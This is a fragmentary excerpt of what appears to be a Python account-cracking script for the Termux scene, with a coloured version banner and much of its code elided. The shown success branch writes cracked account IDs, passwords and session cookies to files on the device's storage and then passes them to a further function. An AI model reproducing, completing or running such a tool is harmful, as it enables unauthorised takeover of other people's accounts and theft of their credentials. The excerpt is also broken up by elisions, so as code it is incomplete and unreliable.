...
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mVERSION \033[1;37m: 0.9
\033[1;37m══════════════════════════════════════""")
def linex():
    print('\033[1;37m══════════════════════════════════════')
def clear():
...
#os.system("espeak -a 300 \"INF,  OK,  YOUCEF,  THANKS,  \"") 
                                        ...
                                        open('/sdcard/INF♥_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/INF💪🏿_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
